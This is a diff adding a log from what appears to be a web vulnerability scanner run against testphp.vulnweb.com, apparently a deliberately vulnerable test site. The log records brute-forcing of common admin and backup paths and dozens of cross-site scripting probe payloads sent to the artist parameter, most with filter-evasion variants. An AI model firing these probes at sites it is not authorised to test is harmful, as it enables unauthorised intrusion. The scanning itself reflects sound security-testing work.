@@ -1,0 +1,558 @@
+2025-02-01 18:29:25,690 - INFO - -- Running vulnerability Scan for test1 on 2025-02-01 at 18:29:25
+2025-02-01 18:29:25,700 - INFO - Starting crawl for target: test1
+2025-02-01 18:29:25,700 - INFO - Crawling Websites
+2025-02-01 18:29:38,402 - INFO - Discovered 6 unique parameters
+2025-02-01 18:29:38,410 - INFO - Crawl results saved in app/reports/reports_for_test1/test1_crawl_results/discovered_urls.txt
+2025-02-01 18:29:38,411 - INFO - Crawling completed.
+2025-02-01 18:29:38,413 - INFO - Checking templates
+2025-02-01 18:29:38,413 - INFO - 6 templates found
+2025-02-01 18:29:38,430 - INFO - Scanning Directory Listing Enabled (Total payloads: 115)
+2025-02-01 18:29:38,430 - INFO - Checking base path: http://testphp.vulnweb.com
+2025-02-01 18:29:38,430 - INFO - Checking path with payload: http://testphp.vulnweb.com/a
+2025-02-01 18:29:39,138 - INFO - Checking path with payload: http://testphp.vulnweb.com/about
+2025-02-01 18:29:39,368 - INFO - Checking path with payload: http://testphp.vulnweb.com/access
+2025-02-01 18:29:39,598 - INFO - Checking path with payload: http://testphp.vulnweb.com/account
+2025-02-01 18:29:39,824 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin
+2025-02-01 18:29:40,282 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/admin
+2025-02-01 18:29:40,307 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_area
+2025-02-01 18:29:40,535 - INFO - Checking path with payload: http://testphp.vulnweb.com/administrator
+2025-02-01 18:29:40,760 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_login
+2025-02-01 18:29:40,989 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_login_page
+2025-02-01 18:29:41,219 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_panel
+2025-02-01 18:29:41,447 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_panel_login
+2025-02-01 18:29:41,673 - INFO - Checking path with payload: http://testphp.vulnweb.com/api
+2025-02-01 18:29:41,902 - INFO - Checking path with payload: http://testphp.vulnweb.com/archive
+2025-02-01 18:29:42,132 - INFO - Checking path with payload: http://testphp.vulnweb.com/articles
+2025-02-01 18:29:42,361 - INFO - Checking path with payload: http://testphp.vulnweb.com/backup
+2025-02-01 18:29:42,588 - INFO - Checking path with payload: http://testphp.vulnweb.com/backup_database
+2025-02-01 18:29:42,818 - INFO - Checking path with payload: http://testphp.vulnweb.com/backup_files
+2025-02-01 18:29:43,046 - INFO - Checking path with payload: http://testphp.vulnweb.com/blog
+2025-02-01 18:29:43,275 - INFO - Checking path with payload: http://testphp.vulnweb.com/business
+2025-02-01 18:29:43,503 - INFO - Checking path with payload: http://testphp.vulnweb.com/config
+2025-02-01 18:29:43,730 - INFO - Checking path with payload: http://testphp.vulnweb.com/config_files
+2025-02-01 18:29:43,960 - INFO - Checking path with payload: http://testphp.vulnweb.com/configuration
+2025-02-01 18:29:44,191 - INFO - Checking path with payload: http://testphp.vulnweb.com/contact
+2025-02-01 18:29:44,420 - INFO - Checking path with payload: http://testphp.vulnweb.com/contact_us
+2025-02-01 18:29:44,650 - INFO - Checking path with payload: http://testphp.vulnweb.com/content
+2025-02-01 18:29:44,880 - INFO - Checking path with payload: http://testphp.vulnweb.com/content_management
+2025-02-01 18:29:45,111 - INFO - Checking path with payload: http://testphp.vulnweb.com/content_upload
+2025-02-01 18:29:45,341 - INFO - Checking path with payload: http://testphp.vulnweb.com/CVS
+2025-02-01 18:29:45,801 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/CVS
+2025-02-01 18:29:45,816 - INFO - Checking path with payload: http://testphp.vulnweb.com/dashboard
+2025-02-01 18:29:46,047 - INFO - Checking path with payload: http://testphp.vulnweb.com/database
+2025-02-01 18:29:46,277 - INFO - Checking path with payload: http://testphp.vulnweb.com/database_backup
+2025-02-01 18:29:46,505 - INFO - Checking path with payload: http://testphp.vulnweb.com/debug
+2025-02-01 18:29:46,735 - INFO - Checking path with payload: http://testphp.vulnweb.com/default
+2025-02-01 18:29:46,965 - INFO - Checking path with payload: http://testphp.vulnweb.com/default_admin
+2025-02-01 18:29:47,192 - INFO - Checking path with payload: http://testphp.vulnweb.com/demo
+2025-02-01 18:29:47,418 - INFO - Checking path with payload: http://testphp.vulnweb.com/documentation
+2025-02-01 18:29:47,646 - INFO - Checking path with payload: http://testphp.vulnweb.com/documentation_page
+2025-02-01 18:29:47,873 - INFO - Checking path with payload: http://testphp.vulnweb.com/download
+2025-02-01 18:29:48,100 - INFO - Checking path with payload: http://testphp.vulnweb.com/education
+2025-02-01 18:29:48,327 - INFO - Checking path with payload: http://testphp.vulnweb.com/email
+2025-02-01 18:29:48,555 - INFO - Checking path with payload: http://testphp.vulnweb.com/faq
+2025-02-01 18:29:48,783 - INFO - Checking path with payload: http://testphp.vulnweb.com/file
+2025-02-01 18:29:49,018 - INFO - Checking path with payload: http://testphp.vulnweb.com/flash
+2025-02-01 18:29:49,245 - INFO - Checking path with payload: http://testphp.vulnweb.com/files
+2025-02-01 18:29:49,472 - INFO - Checking path with payload: http://testphp.vulnweb.com/file_upload
+2025-02-01 18:29:49,701 - INFO - Checking path with payload: http://testphp.vulnweb.com/forum
+2025-02-01 18:29:49,929 - INFO - Checking path with payload: http://testphp.vulnweb.com/guest
+2025-02-01 18:29:50,159 - INFO - Checking path with payload: http://testphp.vulnweb.com/guest_account
+2025-02-01 18:29:50,390 - INFO - Checking path with payload: http://testphp.vulnweb.com/help
+2025-02-01 18:29:50,620 - INFO - Checking path with payload: http://testphp.vulnweb.com/help_desk
+2025-02-01 18:29:50,849 - INFO - Checking path with payload: http://testphp.vulnweb.com/help_page
+2025-02-01 18:29:51,078 - INFO - Checking path with payload: http://testphp.vulnweb.com/home
+2025-02-01 18:29:51,306 - INFO - Checking path with payload: http://testphp.vulnweb.com/images
+2025-02-01 18:29:51,765 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/images
+2025-02-01 18:29:51,781 - INFO - Checking path with payload: http://testphp.vulnweb.com/index
+2025-02-01 18:29:52,009 - INFO - Checking path with payload: http://testphp.vulnweb.com/index_admin
+2025-02-01 18:29:52,240 - INFO - Checking path with payload: http://testphp.vulnweb.com/index_page
+2025-02-01 18:29:52,470 - INFO - Checking path with payload: http://testphp.vulnweb.com/info
+2025-02-01 18:29:52,700 - INFO - Checking path with payload: http://testphp.vulnweb.com/install
+2025-02-01 18:29:52,931 - INFO - Checking path with payload: http://testphp.vulnweb.com/internal
+2025-02-01 18:29:53,162 - INFO - Checking path with payload: http://testphp.vulnweb.com/log
+2025-02-01 18:29:53,394 - INFO - Checking path with payload: http://testphp.vulnweb.com/login
+2025-02-01 18:29:53,622 - INFO - Checking path with payload: http://testphp.vulnweb.com/login_admin
+2025-02-01 18:29:53,851 - INFO - Checking path with payload: http://testphp.vulnweb.com/login_page
+2025-02-01 18:29:54,080 - INFO - Checking path with payload: http://testphp.vulnweb.com/management
+2025-02-01 18:29:54,309 - INFO - Checking path with payload: http://testphp.vulnweb.com/management_panel
+2025-02-01 18:29:54,537 - INFO - Checking path with payload: http://testphp.vulnweb.com/media
+2025-02-01 18:29:54,766 - INFO - Checking path with payload: http://testphp.vulnweb.com/media_files
+2025-02-01 18:29:54,995 - INFO - Checking path with payload: http://testphp.vulnweb.com/media_upload
+2025-02-01 18:29:55,225 - INFO - Checking path with payload: http://testphp.vulnweb.com/members
+2025-02-01 18:29:55,454 - INFO - Checking path with payload: http://testphp.vulnweb.com/members_area
+2025-02-01 18:29:55,683 - INFO - Checking path with payload: http://testphp.vulnweb.com/mysql
+2025-02-01 18:29:55,912 - INFO - Checking path with payload: http://testphp.vulnweb.com/mysql_admin
+2025-02-01 18:29:56,142 - INFO - Checking path with payload: http://testphp.vulnweb.com/_mmServerScripts
+2025-02-01 18:29:56,601 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/_mmServerScripts
+2025-02-01 18:29:56,617 - INFO - Checking path with payload: http://testphp.vulnweb.com/network
+2025-02-01 18:29:56,848 - INFO - Checking path with payload: http://testphp.vulnweb.com/news
+2025-02-01 18:29:57,077 - INFO - Checking path with payload: http://testphp.vulnweb.com/old
+2025-02-01 18:29:57,306 - INFO - Checking path with payload: http://testphp.vulnweb.com/page
+2025-02-01 18:29:57,536 - INFO - Checking path with payload: http://testphp.vulnweb.com/panel
+2025-02-01 18:29:57,766 - INFO - Checking path with payload: http://testphp.vulnweb.com/panel_admin
+2025-02-01 18:29:57,995 - INFO - Checking path with payload: http://testphp.vulnweb.com/panel_login
+2025-02-01 18:29:58,225 - INFO - Checking path with payload: http://testphp.vulnweb.com/password
+2025-02-01 18:29:58,458 - INFO - Checking path with payload: http://testphp.vulnweb.com/password_reset
+2025-02-01 18:29:58,687 - INFO - Checking path with payload: http://testphp.vulnweb.com/pictures
+2025-02-01 18:29:59,143 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/pictures
+2025-02-01 18:29:59,158 - INFO - Checking path with payload: http://testphp.vulnweb.com/private
+2025-02-01 18:29:59,389 - INFO - Checking path with payload: http://testphp.vulnweb.com/profile
+2025-02-01 18:29:59,618 - INFO - Checking path with payload: http://testphp.vulnweb.com/public
+2025-02-01 18:29:59,847 - INFO - Checking path with payload: http://testphp.vulnweb.com/register
+2025-02-01 18:30:00,075 - INFO - Checking path with payload: http://testphp.vulnweb.com/report
+2025-02-01 18:30:00,303 - INFO - Checking path with payload: http://testphp.vulnweb.com/resources
+2025-02-01 18:30:00,531 - INFO - Checking path with payload: http://testphp.vulnweb.com/resources_page
+2025-02-01 18:30:00,762 - INFO - Checking path with payload: http://testphp.vulnweb.com/rss
+2025-02-01 18:30:00,993 - INFO - Checking path with payload: http://testphp.vulnweb.com/search
+2025-02-01 18:30:01,223 - INFO - Checking path with payload: http://testphp.vulnweb.com/secure
+2025-02-01 18:30:01,452 - INFO - Checking path with payload: http://testphp.vulnweb.com/services
+2025-02-01 18:30:01,681 - INFO - Checking path with payload: http://testphp.vulnweb.com/site
+2025-02-01 18:30:01,911 - INFO - Checking path with payload: http://testphp.vulnweb.com/site_admin
+2025-02-01 18:30:02,407 - INFO - Checking path with payload: http://testphp.vulnweb.com/site_login
+2025-02-01 18:30:02,632 - INFO - Checking path with payload: http://testphp.vulnweb.com/sitemap
+2025-02-01 18:30:02,859 - INFO - Checking path with payload: http://testphp.vulnweb.com/stats
+2025-02-01 18:30:03,088 - INFO - Checking path with payload: http://testphp.vulnweb.com/support
+2025-02-01 18:30:03,311 - INFO - Checking path with payload: http://testphp.vulnweb.com/system
+2025-02-01 18:30:03,536 - INFO - Checking path with payload: http://testphp.vulnweb.com/test
+2025-02-01 18:30:03,764 - INFO - Checking path with payload: http://testphp.vulnweb.com/tools
+2025-02-01 18:30:03,988 - INFO - Checking path with payload: http://testphp.vulnweb.com/upload
+2025-02-01 18:30:04,214 - INFO - Checking path with payload: http://testphp.vulnweb.com/upload_files
+2025-02-01 18:30:04,438 - INFO - Checking path with payload: http://testphp.vulnweb.com/uploads
+2025-02-01 18:30:04,663 - INFO - Checking path with payload: http://testphp.vulnweb.com/user
+2025-02-01 18:30:04,889 - INFO - Checking path with payload: http://testphp.vulnweb.com/user_login
+2025-02-01 18:30:05,114 - INFO - Checking path with payload: http://testphp.vulnweb.com/user_management
+2025-02-01 18:30:05,338 - INFO - Checking path with payload: http://testphp.vulnweb.com/vendor
+2025-02-01 18:30:05,788 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/vendor
+2025-02-01 18:30:05,806 - INFO - Checking path with payload: http://testphp.vulnweb.com/web
+2025-02-01 18:30:06,032 - INFO - Checking path with payload: http://testphp.vulnweb.com/webadmin
+2025-02-01 18:30:06,257 - INFO - Checking path with payload: http://testphp.vulnweb.com/webadmin_panel
+2025-02-01 18:30:06,481 - INFO - Checking path with payload: http://testphp.vulnweb.com/webmaster
+2025-02-01 18:30:06,705 - INFO - Checking path with payload: http://testphp.vulnweb.com/website_admin
+2025-02-01 18:30:06,930 - INFO - Vulnerabilities found in template: Directory Listing Enabled
+2025-02-01 18:30:06,930 - INFO - Scanning completed for Directory Listing Enabled! Time elapsed: 41.24 seconds
+2025-02-01 18:30:06,930 - INFO - Vulnerability found in template app/vuln_templates/A01/directorylisting.py
+2025-02-01 18:30:06,943 - INFO - Scanning Sensitive Data Exposure (Total payloads: 115)
+2025-02-01 18:30:06,943 - INFO - Checking base path: http://testphp.vulnweb.com
+2025-02-01 18:30:06,943 - INFO - Checking path with payload: http://testphp.vulnweb.com/a
+2025-02-01 18:30:07,454 - INFO - Checking path with payload: http://testphp.vulnweb.com/about
+2025-02-01 18:30:07,683 - INFO - Checking path with payload: http://testphp.vulnweb.com/access
+2025-02-01 18:30:07,913 - INFO - Checking path with payload: http://testphp.vulnweb.com/account
+2025-02-01 18:30:08,143 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin
+2025-02-01 18:30:08,605 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/admin
+2025-02-01 18:30:08,619 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_area
+2025-02-01 18:30:08,850 - INFO - Checking path with payload: http://testphp.vulnweb.com/administrator
+2025-02-01 18:30:09,081 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_login
+2025-02-01 18:30:09,312 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_login_page
+2025-02-01 18:30:09,543 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_panel
+2025-02-01 18:30:09,774 - INFO - Checking path with payload: http://testphp.vulnweb.com/admin_panel_login
+2025-02-01 18:30:10,005 - INFO - Checking path with payload: http://testphp.vulnweb.com/api
+2025-02-01 18:30:10,237 - INFO - Checking path with payload: http://testphp.vulnweb.com/archive
+2025-02-01 18:30:10,469 - INFO - Checking path with payload: http://testphp.vulnweb.com/articles
+2025-02-01 18:30:10,700 - INFO - Checking path with payload: http://testphp.vulnweb.com/backup
+2025-02-01 18:30:10,933 - INFO - Checking path with payload: http://testphp.vulnweb.com/backup_database
+2025-02-01 18:30:11,165 - INFO - Checking path with payload: http://testphp.vulnweb.com/backup_files
+2025-02-01 18:30:11,395 - INFO - Checking path with payload: http://testphp.vulnweb.com/blog
+2025-02-01 18:30:11,624 - INFO - Checking path with payload: http://testphp.vulnweb.com/business
+2025-02-01 18:30:11,853 - INFO - Checking path with payload: http://testphp.vulnweb.com/config
+2025-02-01 18:30:12,086 - INFO - Checking path with payload: http://testphp.vulnweb.com/config_files
+2025-02-01 18:30:12,316 - INFO - Checking path with payload: http://testphp.vulnweb.com/configuration
+2025-02-01 18:30:12,548 - INFO - Checking path with payload: http://testphp.vulnweb.com/contact
+2025-02-01 18:30:12,777 - INFO - Checking path with payload: http://testphp.vulnweb.com/contact_us
+2025-02-01 18:30:13,007 - INFO - Checking path with payload: http://testphp.vulnweb.com/content
+2025-02-01 18:30:13,237 - INFO - Checking path with payload: http://testphp.vulnweb.com/content_management
+2025-02-01 18:30:13,467 - INFO - Checking path with payload: http://testphp.vulnweb.com/content_upload
+2025-02-01 18:30:13,698 - INFO - Checking path with payload: http://testphp.vulnweb.com/CVS
+2025-02-01 18:30:14,158 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/CVS
+2025-02-01 18:30:14,173 - INFO - Checking path with payload: http://testphp.vulnweb.com/dashboard
+2025-02-01 18:30:14,401 - INFO - Checking path with payload: http://testphp.vulnweb.com/database
+2025-02-01 18:30:14,632 - INFO - Checking path with payload: http://testphp.vulnweb.com/database_backup
+2025-02-01 18:30:14,863 - INFO - Checking path with payload: http://testphp.vulnweb.com/debug
+2025-02-01 18:30:15,092 - INFO - Checking path with payload: http://testphp.vulnweb.com/default
+2025-02-01 18:30:15,324 - INFO - Checking path with payload: http://testphp.vulnweb.com/default_admin
+2025-02-01 18:30:15,555 - INFO - Checking path with payload: http://testphp.vulnweb.com/demo
+2025-02-01 18:30:15,786 - INFO - Checking path with payload: http://testphp.vulnweb.com/documentation
+2025-02-01 18:30:16,016 - INFO - Checking path with payload: http://testphp.vulnweb.com/documentation_page
+2025-02-01 18:30:16,248 - INFO - Checking path with payload: http://testphp.vulnweb.com/download
+2025-02-01 18:30:16,481 - INFO - Checking path with payload: http://testphp.vulnweb.com/education
+2025-02-01 18:30:16,710 - INFO - Checking path with payload: http://testphp.vulnweb.com/email
+2025-02-01 18:30:16,940 - INFO - Checking path with payload: http://testphp.vulnweb.com/faq
+2025-02-01 18:30:17,170 - INFO - Checking path with payload: http://testphp.vulnweb.com/file
+2025-02-01 18:30:17,397 - INFO - Checking path with payload: http://testphp.vulnweb.com/flash
+2025-02-01 18:30:17,628 - INFO - Checking path with payload: http://testphp.vulnweb.com/files
+2025-02-01 18:30:17,858 - INFO - Checking path with payload: http://testphp.vulnweb.com/file_upload
+2025-02-01 18:30:18,088 - INFO - Checking path with payload: http://testphp.vulnweb.com/forum
+2025-02-01 18:30:18,317 - INFO - Checking path with payload: http://testphp.vulnweb.com/guest
+2025-02-01 18:30:18,546 - INFO - Checking path with payload: http://testphp.vulnweb.com/guest_account
+2025-02-01 18:30:18,776 - INFO - Checking path with payload: http://testphp.vulnweb.com/help
+2025-02-01 18:30:19,005 - INFO - Checking path with payload: http://testphp.vulnweb.com/help_desk
+2025-02-01 18:30:19,235 - INFO - Checking path with payload: http://testphp.vulnweb.com/help_page
+2025-02-01 18:30:19,466 - INFO - Checking path with payload: http://testphp.vulnweb.com/home
+2025-02-01 18:30:19,695 - INFO - Checking path with payload: http://testphp.vulnweb.com/images
+2025-02-01 18:30:20,159 - INFO - Checking path with payload: http://testphp.vulnweb.com/index
+2025-02-01 18:30:20,391 - INFO - Checking path with payload: http://testphp.vulnweb.com/index_admin
+2025-02-01 18:30:20,621 - INFO - Checking path with payload: http://testphp.vulnweb.com/index_page
+2025-02-01 18:30:20,852 - INFO - Checking path with payload: http://testphp.vulnweb.com/info
+2025-02-01 18:30:21,082 - INFO - Checking path with payload: http://testphp.vulnweb.com/install
+2025-02-01 18:30:21,312 - INFO - Checking path with payload: http://testphp.vulnweb.com/internal
+2025-02-01 18:30:21,544 - INFO - Checking path with payload: http://testphp.vulnweb.com/log
+2025-02-01 18:30:21,776 - INFO - Checking path with payload: http://testphp.vulnweb.com/login
+2025-02-01 18:30:22,008 - INFO - Checking path with payload: http://testphp.vulnweb.com/login_admin
+2025-02-01 18:30:22,241 - INFO - Checking path with payload: http://testphp.vulnweb.com/login_page
+2025-02-01 18:30:22,471 - INFO - Checking path with payload: http://testphp.vulnweb.com/management
+2025-02-01 18:30:22,700 - INFO - Checking path with payload: http://testphp.vulnweb.com/management_panel
+2025-02-01 18:30:22,930 - INFO - Checking path with payload: http://testphp.vulnweb.com/media
+2025-02-01 18:30:23,162 - INFO - Checking path with payload: http://testphp.vulnweb.com/media_files
+2025-02-01 18:30:23,395 - INFO - Checking path with payload: http://testphp.vulnweb.com/media_upload
+2025-02-01 18:30:23,626 - INFO - Checking path with payload: http://testphp.vulnweb.com/members
+2025-02-01 18:30:23,857 - INFO - Checking path with payload: http://testphp.vulnweb.com/members_area
+2025-02-01 18:30:24,088 - INFO - Checking path with payload: http://testphp.vulnweb.com/mysql
+2025-02-01 18:30:24,320 - INFO - Checking path with payload: http://testphp.vulnweb.com/mysql_admin
+2025-02-01 18:30:24,550 - INFO - Checking path with payload: http://testphp.vulnweb.com/_mmServerScripts
+2025-02-01 18:30:25,012 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/_mmServerScripts
+2025-02-01 18:30:25,027 - INFO - Checking path with payload: http://testphp.vulnweb.com/network
+2025-02-01 18:30:25,257 - INFO - Checking path with payload: http://testphp.vulnweb.com/news
+2025-02-01 18:30:25,488 - INFO - Checking path with payload: http://testphp.vulnweb.com/old
+2025-02-01 18:30:25,718 - INFO - Checking path with payload: http://testphp.vulnweb.com/page
+2025-02-01 18:30:25,948 - INFO - Checking path with payload: http://testphp.vulnweb.com/panel
+2025-02-01 18:30:26,177 - INFO - Checking path with payload: http://testphp.vulnweb.com/panel_admin
+2025-02-01 18:30:26,407 - INFO - Checking path with payload: http://testphp.vulnweb.com/panel_login
+2025-02-01 18:30:26,638 - INFO - Checking path with payload: http://testphp.vulnweb.com/password
+2025-02-01 18:30:26,871 - INFO - Checking path with payload: http://testphp.vulnweb.com/password_reset
+2025-02-01 18:30:27,104 - INFO - Checking path with payload: http://testphp.vulnweb.com/pictures
+2025-02-01 18:30:27,569 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/pictures
+2025-02-01 18:30:27,584 - INFO - Checking path with payload: http://testphp.vulnweb.com/private
+2025-02-01 18:30:27,815 - INFO - Checking path with payload: http://testphp.vulnweb.com/profile
+2025-02-01 18:30:28,046 - INFO - Checking path with payload: http://testphp.vulnweb.com/public
+2025-02-01 18:30:28,276 - INFO - Checking path with payload: http://testphp.vulnweb.com/register
+2025-02-01 18:30:28,507 - INFO - Checking path with payload: http://testphp.vulnweb.com/report
+2025-02-01 18:30:28,738 - INFO - Checking path with payload: http://testphp.vulnweb.com/resources
+2025-02-01 18:30:28,970 - INFO - Checking path with payload: http://testphp.vulnweb.com/resources_page
+2025-02-01 18:30:29,201 - INFO - Checking path with payload: http://testphp.vulnweb.com/rss
+2025-02-01 18:30:29,442 - INFO - Checking path with payload: http://testphp.vulnweb.com/search
+2025-02-01 18:30:29,672 - INFO - Checking path with payload: http://testphp.vulnweb.com/secure
+2025-02-01 18:30:29,903 - INFO - Checking path with payload: http://testphp.vulnweb.com/services
+2025-02-01 18:30:30,134 - INFO - Checking path with payload: http://testphp.vulnweb.com/site
+2025-02-01 18:30:30,364 - INFO - Checking path with payload: http://testphp.vulnweb.com/site_admin
+2025-02-01 18:30:31,021 - INFO - Checking path with payload: http://testphp.vulnweb.com/site_login
+2025-02-01 18:30:31,240 - INFO - Checking path with payload: http://testphp.vulnweb.com/sitemap
+2025-02-01 18:30:31,460 - INFO - Checking path with payload: http://testphp.vulnweb.com/stats
+2025-02-01 18:30:31,679 - INFO - Checking path with payload: http://testphp.vulnweb.com/support
+2025-02-01 18:30:31,897 - INFO - Checking path with payload: http://testphp.vulnweb.com/system
+2025-02-01 18:30:32,116 - INFO - Checking path with payload: http://testphp.vulnweb.com/test
+2025-02-01 18:30:32,337 - INFO - Checking path with payload: http://testphp.vulnweb.com/tools
+2025-02-01 18:30:32,554 - INFO - Checking path with payload: http://testphp.vulnweb.com/upload
+2025-02-01 18:30:32,771 - INFO - Checking path with payload: http://testphp.vulnweb.com/upload_files
+2025-02-01 18:30:32,989 - INFO - Checking path with payload: http://testphp.vulnweb.com/uploads
+2025-02-01 18:30:33,207 - INFO - Checking path with payload: http://testphp.vulnweb.com/user
+2025-02-01 18:30:33,424 - INFO - Checking path with payload: http://testphp.vulnweb.com/user_login
+2025-02-01 18:30:33,644 - INFO - Checking path with payload: http://testphp.vulnweb.com/user_management
+2025-02-01 18:30:33,863 - INFO - Checking path with payload: http://testphp.vulnweb.com/vendor
+2025-02-01 18:30:34,298 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/vendor
+2025-02-01 18:30:34,306 - INFO - Checking path with payload: http://testphp.vulnweb.com/web
+2025-02-01 18:30:34,522 - INFO - Checking path with payload: http://testphp.vulnweb.com/webadmin
+2025-02-01 18:30:34,743 - INFO - Checking path with payload: http://testphp.vulnweb.com/webadmin_panel
+2025-02-01 18:30:34,961 - INFO - Checking path with payload: http://testphp.vulnweb.com/webmaster
+2025-02-01 18:30:35,180 - INFO - Checking path with payload: http://testphp.vulnweb.com/website_admin
+2025-02-01 18:30:35,400 - INFO - Vulnerabilities found in template: Sensitive Data Exposure
+2025-02-01 18:30:35,400 - INFO - Scanning completed for Sensitive Data Exposure! Time elapsed: 69.71 seconds
+2025-02-01 18:30:35,401 - INFO - Vulnerability found in template app/vuln_templates/A01/sensitivedataexposure.py
+2025-02-01 18:30:35,416 - INFO - Scanning Cross-Site Scripting (XSS) (Total payloads: 76)
+2025-02-01 18:30:35,417 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(1234)</script>
+2025-02-01 18:30:35,926 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<ScripT>alert(1234)</ScRipT>
+2025-02-01 18:30:36,141 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert(123)</script>
+2025-02-01 18:30:36,356 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='><script>alert(123)</script>
+2025-02-01 18:30:36,570 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==--><script>alert(123)</script>
+2025-02-01 18:30:36,786 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==><script>alert(123)</script>
+2025-02-01 18:30:37,001 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==＜script＞alert(123)＜/script＞
+2025-02-01 18:30:37,215 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert(123);</script x="
+2025-02-01 18:30:37,429 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='><script>alert(123);</script x='
+2025-02-01 18:30:37,644 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==><script>alert(123);</script x=
+2025-02-01 18:30:37,860 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>’alert(1)’.replace(/.+/,eval)</script>
+2025-02-01 18:30:38,075 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=="><script>alert(1)</script><"
+2025-02-01 18:30:38,291 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==#<script>alert(1)</script>
+2025-02-01 18:30:38,509 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='`"//><script>alert(1)</script>
+2025-02-01 18:30:38,729 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<!<script>alert(1)</script>
+2025-02-01 18:30:38,945 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<!<script>alert(1)</script> “
+2025-02-01 18:30:39,162 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<%<!--'%><script>alert(1);</script -->
+2025-02-01 18:30:39,378 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<%<script>alert(1)</script>
+2025-02-01 18:30:39,595 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<scr'+'ipt>alert(1)</scr'+'ipt>
+2025-02-01 18:30:39,811 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script /**/>/**/alert(1)/**/</script /**/
+2025-02-01 18:30:40,027 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>/&/-alert(1)</script>
+2025-02-01 18:30:40,241 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(1)</script>
+2025-02-01 18:30:40,458 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert`1`</script>
+2025-02-01 18:30:40,673 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==\<script\>alert(1)\<\/script\>
+2025-02-01 18:30:40,888 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==“><script>alert(1);</script>
+2025-02-01 18:30:41,102 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<sCRipT>alert(1)</sCRiPt>
+2025-02-01 18:30:41,320 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<ScRiPt>alert(1)</sCriPt>
+2025-02-01 18:30:41,537 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==#<ScRiPt>alert(1)</ScRiPt>#
+2025-02-01 18:30:41,754 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<ScRiPt>alert(1)</ScRiPt>
+2025-02-01 18:30:41,971 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<<SCRIPT>alert(1);//<</SCRIPT>
+2025-02-01 18:30:42,187 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==*/</script>'>alert(1)/*<script/1='
+2025-02-01 18:30:42,401 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(1)</script>.asp
+2025-02-01 18:30:42,617 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(1)</script>.aspx
+2025-02-01 18:30:42,833 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(1)</script>.htm
+2025-02-01 18:30:43,048 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(1)</script>.html
+2025-02-01 18:30:43,264 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==<script>alert(1)</script>.php
+2025-02-01 18:30:43,480 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='"><script>alert(2);</script>
+2025-02-01 18:30:43,693 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='>  <script>alert(2);</script>
+2025-02-01 18:30:43,908 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist=='>'+'><script>alert(2);</script>
+2025-02-01 18:30:44,123 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==>"'><script>alert(2);</script>
+2025-02-01 18:30:44,339 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==>'"><script>alert(2);</script>
+2025-02-01 18:30:44,555 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==>'><script>alert(2);</script>
